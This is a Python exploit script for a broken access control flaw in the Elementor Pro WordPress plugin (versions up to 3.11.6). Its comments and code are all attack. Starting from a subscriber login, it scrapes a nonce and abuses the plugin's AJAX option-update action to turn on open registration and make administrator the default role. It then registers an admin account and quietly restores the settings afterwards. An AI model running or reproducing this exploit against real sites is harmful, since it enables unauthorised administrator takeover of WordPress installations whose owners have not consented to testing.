#!/usr/bin/env python3

# With help of: https://blog.nintechnet.com/high-severity-vulnerability-fixed-in-wordpress-elementor-pro-plugin/
# Vulnerable versions <= 3.11.6
# Classification Broken Access Control
# OWASP Top 10 A5: Broken Access Control
# Required privilege Subscriber
# Credits JEROME BRUANDET



# prequisite: normal account with subscriber role
# Get the nonce
# Make a post request to /wp-admin/admin-ajax.php
# with actions={"pro_woocommerce_update_page_option":{"action":"pro_woocommerce_update_page_option","data":{"option_name":"users_can_register","editor_post_id":1}}}&_nonce=e870f4c82e&action=elementor_ajax
# --> To update the users_can_register option to true
# Make a post request to /wp-admin/admin-ajax.php
# with actions={"pro_woocommerce_update_page_option":{"action":"pro_woocommerce_update_page_option","data":{"option_name":"default_role","editor_post_id":"administrator"}}}&_nonce=e870f4c82e&action=elementor_ajax
# --> To update the default_role option to administrator

# Quickly register a new account
# Login as authenticated user with administrator role



import requests
BASE_URL = ""
session = requests.Session()


def login(log, pwd):
    url = f"{BASE_URL}/wp-login.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "nl,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate",
               "Content-Type": "application/x-www-form-urlencoded", "Origin": BASE_URL, "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    data = {"log": log, "pwd": pwd, "wp-submit": "Log In",
            "redirect_to": f"{BASE_URL}/wp-admin/index.php?wc-ajax=1"}
    print("[*] Logging in...")
    r = session.post(url, headers=headers, data=data, allow_redirects=True)

    # Get the nonce
    content = str(r.content)
    content = content[content.find("elementor-common-js-before"):]
    content = content[:content.find("</script>")]
    nonce = content[content.find("nonce")+8:content.find("nonce")+18]
    print(f"[*] Got nonce: {nonce}")
    return nonce


def update_users_can_register(nonce, can_register=1):
    url = f"{BASE_URL}/wp-admin/admin-ajax.php"
    data = {"actions": "{\"pro_woocommerce_update_page_option\":{\"action\":\"pro_woocommerce_update_page_option\",\"data\":{\"option_name\":\"users_can_register\",\"editor_post_id\":%d}}}" % can_register,
                  "_nonce": nonce, "action": "elementor_ajax"}
    r = session.post(url, data=data)
    resp = r.json()

    try:
        if resp["data"]["responses"]["pro_woocommerce_update_page_option"]["success"]:
            print(f"[*] Updated users_can_register option to {can_register}")
    except:
        print(f"[!] Failed to update users_can_register option to {can_register}")

def update_default_role(nonce, default_role="administrator"):
    url = f"{BASE_URL}/wp-admin/admin-ajax.php"
    data = {"actions": "{\"pro_woocommerce_update_page_option\":{\"action\":\"pro_woocommerce_update_page_option\",\"data\":{\"option_name\":\"default_role\",\"editor_post_id\":\"%s\"}}}" % default_role,
                  "_nonce": nonce, "action": "elementor_ajax"}
    r = session.post(url, data=data)
    resp = r.json()

    try:
        if resp["data"]["responses"]["pro_woocommerce_update_page_option"]["success"]:
            print(f"[*] Updated default_role option to {default_role}")
    except:
        print(f"[!] Failed to update default_role option to {default_role}")


def register_account_with_admin_priv(username, email):
    url = f"{BASE_URL}/wp-login.php?action=register"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "nl,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded",  "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    data = {"user_login": username, "user_email": email, "redirect_to": '', "wp-submit": "Register"}
    r = requests.post(url, headers=headers, data=data)
    if r.status_code == 200:
        print(f"[*] Successfully registered admin account {username} with email {email}")
        print(f"[*] Check your email for the credentials")
    
    else:
        print(f"[!] Failed to register admin account {username} with email {email}")
        print(f"[!] Status code: {r.status_code}")
    
    


def explain_script():
    txt = """
python3 elementor_exploit.py <url> <username> <password> <email>
example: python3 elementor_exploit.py http://wordpress.local dahacker password test@email.com
where:
    url: the url of the wordpress site
    username: the username of the subscriber account
    password: the password of the subscriber account
    email: the email address to register the admin account with (default username: explOit)
    """
    print(txt)


if __name__ == "__main__":
    import sys
    if len(sys.argv) != 5 or sys.argv[1] == "-h" or sys.argv[1] == "--help":
        explain_script()
        exit(0)

    BASE_URL = sys.argv[1]
    log = sys.argv[2]
    pwd = sys.argv[3]
    email = sys.argv[4]


    nonce = login(log, pwd)
    update_users_can_register(nonce)
    update_default_role(nonce)
    register_account_with_admin_priv("explOit", email)
    print(f"[*] Setting the default_role back to subscriber and users_can_register back to false")
    update_users_can_register(nonce, 0)
    update_default_role(nonce, "subscriber")
